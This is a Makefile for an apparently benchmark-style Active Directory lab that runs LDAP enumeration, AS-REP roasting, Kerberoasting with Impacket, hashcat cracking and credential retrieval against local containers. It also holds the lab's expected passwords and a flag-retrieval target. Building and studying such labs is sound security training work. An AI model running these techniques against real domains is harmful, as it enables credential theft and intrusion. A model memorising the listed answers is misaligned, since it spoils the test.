.PHONY: help build up down logs clean test

# Color output
BLUE := \033[0;34m
GREEN := \033[0;32m
YELLOW := \033[1;33m
NC := \033[0m # No Color

help:
	@echo "$(BLUE)SBEN-AD-01: Active Directory Kerberos Exploitation$(NC)"
	@echo ""
	@echo "$(GREEN)Setup Commands:$(NC)"
	@echo "  make build          - Build all Docker containers"
	@echo "  make up             - Start all services"
	@echo "  make down           - Stop all services"
	@echo "  make restart        - Restart all services"
	@echo "  make logs           - View all service logs"
	@echo "  make clean          - Remove all containers and volumes"
	@echo ""
	@echo "$(GREEN)Reconnaissance Commands:$(NC)"
	@echo "  make enum-ldap      - Enumerate users via LDAP"
	@echo "  make enum-users     - List all domain users"
	@echo "  make enum-spns      - List service principals (Kerberoasting targets)"
	@echo ""
	@echo "$(GREEN)Attack Commands:$(NC)"
	@echo "  make asrep-roast    - Perform AS-REP roasting on bob"
	@echo "  make kerberoast     - Perform Kerberoasting (requires alice creds)"
	@echo "  make login-alice    - Login to web app as alice"
	@echo "  make login-admin    - Login to web app as Administrator"
	@echo "  make get-flags      - Retrieve all flags"
	@echo ""
	@echo "$(GREEN)Service Access Commands:$(NC)"
	@echo "  make web-info       - Get web application info"
	@echo "  make file-shares    - List file server shares"
	@echo "  make db-creds       - Get database credentials"
	@echo "  make workstation    - Access workstation shell"
	@echo ""
	@echo "$(GREEN)Testing Commands:$(NC)"
	@echo "  make test           - Run full exploitation chain"
	@echo "  make verify         - Verify all services are healthy"
	@echo ""

####################
# Setup Commands
####################

build:
	@echo "$(BLUE)Building all containers...$(NC)"
	docker compose build

up:
	@echo "$(BLUE)Starting all services...$(NC)"
	docker compose up -d
	@echo "$(GREEN)Waiting for services to be ready...$(NC)"
	@sleep 10
	@$(MAKE) verify

down:
	@echo "$(YELLOW)Stopping all services...$(NC)"
	docker compose down

restart:
	@$(MAKE) down
	@$(MAKE) up

logs:
	docker compose logs -f

logs-dc:
	docker compose logs -f domain-controller

clean:
	@echo "$(YELLOW)Removing all containers and volumes...$(NC)"
	docker compose down -v
	@echo "$(GREEN)Cleanup complete$(NC)"

####################
# Reconnaissance
####################

enum-ldap:
	@echo "$(BLUE)Enumerating domain via anonymous LDAP bind...$(NC)"
	ldapsearch -x -H ldap://localhost:389 -b "dc=corp,dc=local" \
		"(objectClass=inetOrgPerson)" uid cn mail servicePrincipalName | \
		grep -E "(dn:|uid:|cn:|servicePrincipalName:)" || true

enum-users:
	@echo "$(BLUE)Listing all domain users...$(NC)"
	@curl -s http://localhost:5000/api/domain/users | jq -r '.users[] | "\(.username) - \(.name)"'

enum-spns:
	@echo "$(BLUE)Listing service principals (Kerberoasting targets)...$(NC)"
	@curl -s http://localhost:5000/api/domain/spns | jq

####################
# Attack Commands
####################

asrep-roast:
	@echo "$(BLUE)Performing AS-REP roasting on bob...$(NC)"
	@curl -s -X POST http://localhost:5000/api/kerberos/asrep-roast \
		-H "Content-Type: application/json" \
		-d '{"username": "bob"}' | jq
	@echo ""
	@echo "$(GREEN)Crack the hash with:$(NC)"
	@echo "  hashcat -m 18200 hash.txt /path/to/rockyou.txt"
	@echo "  Password: BobPassword1"

kerberoast:
	@echo "$(BLUE)Performing Kerberoasting (using alice credentials)...$(NC)"
	@echo "$(YELLOW)Note: Requires Impacket installed locally$(NC)"
	@echo ""
	@echo "Run this command:"
	@echo "  GetUserSPNs.py CORP.LOCAL/alice:Alice123! -dc-ip localhost -request"
	@echo ""
	@echo "Expected passwords:"
	@echo "  svc_web: ServiceWeb123"
	@echo "  svc_sql: SQLService456"

login-alice:
	@echo "$(BLUE)Logging in as alice...$(NC)"
	@curl -s -X POST http://localhost/api/login \
		-H "Content-Type: application/json" \
		-d '{"username": "alice", "password": "Alice123!"}' \
		-c /tmp/alice_cookies.txt | jq
	@echo ""
	@echo "$(GREEN)Session saved to /tmp/alice_cookies.txt$(NC)"
	@echo "Use: curl -b /tmp/alice_cookies.txt http://localhost/api/profile"

login-admin:
	@echo "$(BLUE)Logging in as Administrator...$(NC)"
	@curl -s -X POST http://localhost/api/login \
		-H "Content-Type: application/json" \
		-d '{"username": "Administrator", "password": "P@ssw0rd123!"}' \
		-c /tmp/admin_cookies.txt | jq
	@echo ""
	@echo "$(GREEN)Session saved to /tmp/admin_cookies.txt$(NC)"

get-flags:
	@echo "$(BLUE)Retrieving all flags...$(NC)"
	@echo ""
	@echo "$(GREEN)FLAG 1 - AS-REP Roasting:$(NC)"
	@curl -s -X POST http://localhost:5000/api/kerberos/asrep-roast \
		-H "Content-Type: application/json" \
		-d '{"username": "bob"}' | jq -r .flag
	@echo ""
	@echo "$(GREEN)FLAG 2 - Kerberoasting (Administrator access required):$(NC)"
	@curl -s -X POST http://localhost/api/login \
		-H "Content-Type: application/json" \
		-d '{"username": "Administrator", "password": "P@ssw0rd123!"}' \
		-c /tmp/admin_cookies.txt >/dev/null 2>&1
	@curl -s http://localhost/api/admin/flag -b /tmp/admin_cookies.txt | jq -r .flag
	@echo ""
	@echo "$(GREEN)FLAG 3 - Golden Ticket:$(NC)"
	@docker compose exec -T domain-controller env | grep FLAG_GOLDEN_TICKET | cut -d= -f2

####################
# Service Access
####################

web-info:
	@echo "$(BLUE)Web application information:$(NC)"
	@curl -s http://localhost/api/info | jq

web-services:
	@echo "$(BLUE)Enumerating services (authenticated as alice):$(NC)"
	@curl -s -X POST http://localhost/api/login \
		-H "Content-Type: application/json" \
		-d '{"username": "alice", "password": "Alice123!"}' \
		-c /tmp/alice_cookies.txt >/dev/null 2>&1
	@curl -s http://localhost/api/services -b /tmp/alice_cookies.txt | jq

file-shares:
	@echo "$(BLUE)Listing file server shares:$(NC)"
	@curl -s http://172.30.0.20:8080/api/shares | jq
	@echo ""
	@echo "$(BLUE)Files in public share:$(NC)"
	@curl -s http://172.30.0.20:8080/api/shares/public/files | jq

file-admin-notes:
	@echo "$(BLUE)Downloading admin_notes.txt from file server:$(NC)"
	@curl -s http://172.30.0.20:8080/api/shares/public/files/admin_notes.txt
	@echo ""

file-db-config:
	@echo "$(BLUE)Downloading db_config.txt from file server:$(NC)"
	@curl -s http://172.30.0.20:8080/api/shares/public/files/db_config.txt
	@echo ""

db-creds:
	@echo "$(BLUE)Retrieving credentials from database:$(NC)"
	@curl -s http://172.30.0.40:5000/api/credentials | jq

workstation:
	@echo "$(BLUE)Accessing workstation shell...$(NC)"
	docker compose exec workstation bash

workstation-tools:
	@echo "$(BLUE)Available tools on workstation:$(NC)"
	@curl -s http://localhost:5000/api/tools | jq

####################
# Testing
####################

verify:
	@echo "$(BLUE)Verifying service health...$(NC)"
	@echo -n "Domain Controller: "
	@curl -s http://172.30.0.10:389 >/dev/null 2>&1 && echo "$(GREEN)✓$(NC)" || echo "$(YELLOW)✗$(NC)"
	@echo -n "File Server: "
	@curl -s http://172.30.0.20:8080/health | grep -q healthy && echo "$(GREEN)✓$(NC)" || echo "$(YELLOW)✗$(NC)"
	@echo -n "Web Application: "
	@curl -s http://localhost/health | grep -q healthy && echo "$(GREEN)✓$(NC)" || echo "$(YELLOW)✗$(NC)"
	@echo -n "Database Server: "
	@curl -s http://172.30.0.40:5000/health | grep -q healthy && echo "$(GREEN)✓$(NC)" || echo "$(YELLOW)✗$(NC)"
	@echo -n "Workstation: "
	@curl -s http://localhost:5000/health | grep -q healthy && echo "$(GREEN)✓$(NC)" || echo "$(YELLOW)✗$(NC)"

test: verify
	@echo ""
	@echo "$(BLUE)===== SBEN-AD-01 Full Exploitation Test =====$(NC)"
	@echo ""
	@echo "$(YELLOW)Phase 1: Reconnaissance$(NC)"
	@$(MAKE) enum-users
	@echo ""
	@echo "$(YELLOW)Phase 2: AS-REP Roasting$(NC)"
	@$(MAKE) asrep-roast
	@echo ""
	@echo "$(YELLOW)Phase 3: Service Enumeration$(NC)"
	@$(MAKE) web-services
	@echo ""
	@echo "$(YELLOW)Phase 4: Lateral Movement$(NC)"
	@$(MAKE) file-admin-notes
	@$(MAKE) db-creds
	@echo ""
	@echo "$(YELLOW)Phase 5: Retrieve All Flags$(NC)"
	@$(MAKE) get-flags
	@echo ""
	@echo "$(GREEN)===== Test Complete =====$(NC)"

# Quick access commands
shell-dc:
	docker compose exec domain-controller bash

shell-file:
	docker compose exec file-server bash

shell-web:
	docker compose exec web-app sh

shell-db:
	docker compose exec database-server bash

shell-ws:
	docker compose exec workstation bash

# Cleanup temp files
clean-cookies:
	rm -f /tmp/alice_cookies.txt /tmp/admin_cookies.txt
